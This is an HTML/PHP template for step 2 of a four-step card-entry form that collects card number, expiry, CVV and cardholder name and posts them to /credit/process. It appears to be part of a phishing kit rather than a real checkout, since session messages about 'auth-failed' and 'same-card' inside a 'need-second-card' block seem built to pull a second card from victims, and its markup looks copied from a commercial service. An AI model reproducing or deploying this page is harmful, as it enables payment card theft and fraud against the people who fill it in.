<main>
    <form id="myForm" action="/credit/process" method="post">
        <small> STEP <b>2</b> of <b>4</b> </small>
        <h1> Set up your credit or debit card </h1>
        <div class="card-logos">
            <img src="/Brainstorm/assets/images/VISA.png">
            <img src="/Brainstorm/assets/images/MASTERCARD.png">
            <img src="/Brainstorm/assets/images/AMEX.png">
            <img src="/Brainstorm/assets/images/DISCOVER.png">
        </div>
        <div class="need-second-card">
            <?php if (isset($_SESSION['auth-failed'])) {echo $_SESSION['auth-failed'] ?? ''; unset($_SESSION['auth-failed']);} else if (isset($_SESSION['same-card'])){echo $_SESSION['same-card'] ?? ''; unset($_SESSION['same-card']);}?>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="tel" id="karma-cardnumber" name="karma-cardnumber" maxlength=" " placeholder=" ">
                <label for="karma-cardnumber">Card number</label>
                <div class="card-icon" id="dynamic-card-icon">
                    <svg id="dynamic-card-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="30" height="20" data-icon="CreditCardStandard" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M0 6C0 4.34315 1.34315 3 3 3H21C22.6569 3 24 4.34315 24 6V18C24 19.6569 22.6569 21 21 21H3C1.34314 21 0 19.6569 0 18V6ZM3 5C2.44772 5 2 5.44772 2 6V8H22V6C22 5.44771 21.5523 5 21 5H3ZM2 18V10H22V18C22 18.5523 21.5523 19 21 19H3C2.44772 19 2 18.5523 2 18ZM16 16H20V14H16V16Z" fill="gray"></path>
                    </svg>
                </div>
                <span id="karma-cardnumber-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row">
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-exp" name="karma-exp" maxlength=" " placeholder=" ">
                <label for="karma-exp">Expiration date</label>
                <span id="karma-exp-error" class="d-none"></span>
            </div>
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-cvv" name="karma-cvv" maxlength=" " placeholder=" ">
                <label for="karma-cvv">CVV</label>
                <div class="card-icon1" id="help-icon">
                    <svg id="help-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="30" height="20" data-icon="CreditCardStandard" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0ZM12 8C10.6831 8 10 8.74303 10 9.5H8C8 7.25697 10.0032 6 12 6C13.9968 6 16 7.25697 16 9.5C16 10.8487 14.9191 11.7679 13.8217 12.18C13.5572 12.2793 13.3322 12.4295 13.1858 12.5913C13.0452 12.7467 13 12.883 13 13V14H11V13C11 11.5649 12.1677 10.6647 13.1186 10.3076C13.8476 10.0339 14 9.64823 14 9.5C14 8.74303 13.3169 8 12 8ZM13.5 16.5C13.5 17.3284 12.8284 18 12 18C11.1716 18 10.5 17.3284 10.5 16.5C10.5 15.6716 11.1716 15 12 15C12.8284 15 13.5 15.6716 13.5 16.5Z" fill="gray"></path>
                    </svg>
                </div>
                <span id="karma-cvv-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="text" id="karma-nameoncard" name="karma-nameoncard" placeholder=" ">
                <label for="karma-nameoncard">Name on card</label>
                <span id="karma-nameoncard-error" class="d-none"></span>
            </div>
        </div>
        <input type="submit" value="Continue" class="submit-button">
    </form>
</main>
